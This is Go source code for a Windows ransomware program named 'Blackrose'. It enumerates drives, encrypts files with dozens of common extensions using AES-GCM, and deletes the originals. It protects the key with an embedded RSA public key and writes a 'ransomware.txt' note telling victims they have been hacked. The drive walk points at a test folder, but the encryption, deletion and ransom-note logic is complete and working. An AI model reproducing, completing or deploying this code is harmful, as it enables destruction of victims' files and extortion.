package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/md5"
    "crypto/rand"
    "crypto/rsa"
    "crypto/sha512"
    "crypto/x509"
    "encoding/hex"
    "encoding/pem"
    "io"
    "io/ioutil"
    "log"
    "os"
    "path/filepath"
    "reflect"
    "strings"
    "sync"
    "syscall"
    "time"
    "unsafe"
)

const (
    DRIVE_REMOVABLE   = 2
	DRIVE_FIXED       = 3
	DRIVE_REMOTE      = 4
)

type Walker func(path string, ctx *BlackroseEncryptionContext, wg *sync.WaitGroup)

var (
    filenameToDelete chan string
    kernel32 *syscall.DLL
    procGetLogicalDrives *syscall.Proc
    procGetDriveType *syscall.Proc
    forbiddenFolders = []string{
        "C:\\Program Files", "C:\\Program Files (x86)",
        "C:\\Windows", "C:\\System Volume Information",
    }
    attackExtensions = []string {
        ".pug", ".env", ".mp4", ".jsx", ".pem", ".hbs",
        ".ejs", ".sql", ".htm", ".html", ".pdf", ".docx",
        ".xlsx", ".jpg", ".png", ".ico", ".txt", ".zip",
        ".rar", ".py", ".c", ".cpp", ".hpp", ".h", ".go",
        ".js", ".lua", ".java", ".class", ".xml", ".json",
        ".mp3", ".wav", ".vob", ".xps", ".ppt", ".pot",
        ".pps", ".pptx", ".pptm", ".potx", ".potm",
        ".ppam", ".ppsm", ".sldx", ".sldm", ".xltx",
        ".xltm", ".xlsb", ".xla", ".xlam", ".xll", ".xlw",
        ".doc", ".dot", ".wbk", ".docm", ".dotx", ".dotm",
        ".docb", ".pub", ".ACCDB", ".ACCDE", ".ACCDT", ".ACCDR",
    }
)

type BlackroseEncryptionContext struct {
    nonce []byte
    gcmFunc cipher.AEAD
    encodedPassword string
}

func (c *BlackroseEncryptionContext) encrypt(buf []byte) []byte {
    _, err := io.ReadAtLeast(rand.Reader, c.nonce, len(c.nonce))
    if err != nil {
        panic(err.Error())
    }
    defer func() {
        if r := recover(); r != nil {
            os.Exit(0)
        }
    }()
    return c.gcmFunc.Seal(c.nonce, c.nonce, buf, nil)
}

func GenerateRandomBytes(nBytes int) ([]byte, error) {
    buf := make([]byte, nBytes)
    n, err := rand.Read(buf)
    if err != nil {
        return nil, err
    } else {
        return buf[:n], nil
    }
}

func GenerateRandomString(nLen int) (string, error) {
    buf, err := GenerateRandomBytes(nLen)
    if err != nil {
        return "", err
    }
    s := "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-"
    for i := 0; i < len(buf); i++ {
        buf[i] = s[buf[i]%63]
    }
    return string(buf), nil
}

func init() {
    filenameToDelete = make(chan string, 20)
    kernel32 = syscall.MustLoadDLL("kernel32.dll")
    procGetLogicalDrives = kernel32.MustFindProc("GetLogicalDrives")
    procGetDriveType = kernel32.MustFindProc("GetDriveTypeW")
}

func main() {
    genStr, err := GenerateRandomString(0x40)
    if err != nil {
        genStr = strings.ReplaceAll(time.Now().UTC().String(), " ", "")
    }
    publicKeyBytes := []byte("-----BEGIN RSA PUBLIC KEY-----\x0AMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA4pDVvz2bJdXYaQFo8MzT\x0ACgGIDHED8EX5M4IJ3LroDVW40SBHrW0zXkkeuP/eFJZzdPpGIJMaLplWqrdR4DuT\x0A8iK9SP8COr+VWbiZhN9kabhGNuIw8cRr9Z5Ywe3wclqyr5VYCqHmvb4F7SXim5LM\x0AK/nnTh1PuOHKUc3px43kuZlVYSuElX3zJ1rlzST7MV4uOtIv2I8cZDRAKB1d7ZrO\x0A0UjrsBvrYiU1NEw0vvac9hsoqTgTw4YzhAxqNncjE3sS3g26umAZLaiRXQjqR0hr\x0AgkpZjlLaInrXAYPyo6bQvjBP6WR7nMWbohnAAsfP6EuSicG6Q7njIRePZACgrIx0\x0A5I64KJME9B+6T+E+X2dGbxFKND7w7aAUvGekoFIrXKfgHOP3jxMf7deBIlsd2KLU\x0Arxr+sb86Oq1cZb3eGbVmuxCR8t0RvmH68FxcjYIqoB1xsByCMtYGIwSrd/GURWH+\x0Ais++bwnxFXVta1fhZdx2tlIJIUha3o8vkXzzsdKRoR/U4833KPJ7m8Za7cswVENs\x0AzorOnOqkaINBemG0X8dbp4GIoWIEb+2oGWraiNcwZx7KcVaSxp1uC4dRUK/vpGRd\x0A5F7M6/59DfrJFqxEs6wXvCNx8FNfFSFPnjy/Tb3vS7MTfAWAM/GKhHdpGHWyw5LO\x0AmQAqD4D3LEWgt+bbmEuMYpECAwEAAQ==\x0A-----END RSA PUBLIC KEY-----")
    out := EncryptWithPublicKey([]byte(genStr), BytesToPublicKey(publicKeyBytes))
    res := make([]byte, len(out)*2)
    hex.Encode(res, out)
    context := CreateBlackroseGCMContext(genStr, string(res))
    defer func() {
        context.nonce = nil
    }()
    wg := new(sync.WaitGroup)
    EncryptAllDrives(iterate_files_and_folders, context, wg)
    wg.Wait()
}

func EncryptAllDrives(walk Walker, ctx *BlackroseEncryptionContext, wg *sync.WaitGroup) {
    drvList := []string{
        "A:", "B:", "C:", "D:", "E:", "F:", "G:",
        "H:", "I:", "J:", "K:", "L:", "M:", "N:",
        "O:", "P:", "Q:", "R:", "S:", "T:", "U:",
        "V:", "W:", "X:", "Y:", "Z:",
    }
    drvMask, _, _ := procGetLogicalDrives.Call()
    for i := 0; i < 26; i++ {
        if drvMask&1 == 1 {
            u16b, _ := syscall.UTF16FromString(drvList[i])
            drvType, _, _ := procGetDriveType.Call(uintptr(unsafe.Pointer(&u16b[0])))
            if drvType == DRIVE_FIXED || drvType == DRIVE_REMOTE ||
                drvType == DRIVE_REMOVABLE {
                wg.Add(1)
                go func() {
                    walk("C:\\Users\\User\\Encryption\\testfiles", ctx, wg)
                    wg.Done()
                }()
            }
        }
        drvMask >>= 1
    }
}

func iterate_files_and_folders(root string, ctx *BlackroseEncryptionContext, wg *sync.WaitGroup) {
    ch := make(chan int, 5)
    filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
        if err != nil {
            log.Fatal(err.Error())
        }
        size := info.Size()
        if size > 0x12C00000 {
            return nil
        }
        if info.IsDir() && !SliceExists(forbiddenFolders, path) {
            wg.Add(1)
            go createRansomwareNote(path, ctx.encodedPassword, wg)
        }
        if info.IsDir() {
            return filepath.SkipDir
        }
        if SliceExists(attackExtensions, filepath.Ext(info.Name())) {
            ch <- 1
            go func() {
                wg.Add(1)
                encryptFile(path, ctx)
                <-ch
                wg.Done()
            }()
        }
        return nil
    })
    close(filenameToDelete)
}

func encryptFile(path string, ct *BlackroseEncryptionContext) {
    buf, _ := ioutil.ReadFile(path)
    fp, _ := os.OpenFile(path+".blackrose", 0o1102, 0o666)
    defer func() {
        fp.Close()
        os.Remove(path)
    }()
    fp.Write(ct.encrypt(buf))
}

func SliceExists(sl interface{}, path interface{}) bool {
    vl := reflect.ValueOf(sl)
    if vl.Kind() != reflect.Slice {
        panic("SliceExists() given a non-slice type")
    }
    for i := 0; i < vl.Len(); i++ {
        e := vl.Index(i).Interface()
        if e == path {
            return true
        }
    }
    return false
}

func createRansomwareNote(path string, passwd string, wg *sync.WaitGroup) {
    fp, _ := os.OpenFile(path + "\\ransomware.txt", 0o1102, 0o666)
    defer fp.Close()
    fp.Write([]byte("If you are reading this then you have been hacked. Your files have been encrypted using AES 256 key bit algorithm and the password encrypted with a 4096 bit RSA public key\x0AAny attempt by any person to decrypt the files or bruteforce the key will be futile and lead to loss of time and precious data\x0A\x0AAdios Muchachoz!!!\x0A\x0APASSWORD\x0A    " + passwd))
    wg.Done()
}

func CreateBlackroseGCMContext(str string, encPasswd string) *BlackroseEncryptionContext {
    key := func() []byte {
        md := md5.New()
        md.Write([]byte(str))
        return md.Sum(nil)
    }()
    block, err := aes.NewCipher(key)
    tAEAD, err := cipher.NewGCMWithNonceSize(block, 12)
    if err != nil {
        panic(err.Error())
    }
    buf := make([]byte, tAEAD.NonceSize())
    ctx := new(BlackroseEncryptionContext)
    ctx.nonce = buf
    ctx.gcmFunc = tAEAD
    ctx.encodedPassword = encPasswd
    return ctx
}

func EncryptWithPublicKey(data []byte, pubKey *rsa.PublicKey) []byte {
    res, err := rsa.EncryptOAEP(sha512.New(), rand.Reader, pubKey, data, nil)
    if err != nil {
        log.Fatal(err)
    }
    return res
}

func BytesToPublicKey(bytes []byte) *rsa.PublicKey {
    var err error
    block, _ := pem.Decode(bytes)
    buf := block.Bytes
    if _, ok := block.Headers["DEK-Info"]; ok {
        buf, err = x509.DecryptPEMBlock(block, nil)
        if err != nil {
            log.Fatal(err)
        }
    }
    pub, err := x509.ParsePKIXPublicKey(buf)
    if err != nil {
        log.Fatal(err)
    }
    publicKey, ok := pub.(*rsa.PublicKey)
    if !ok {
        log.Fatal("not ok")
    }
    return publicKey
}
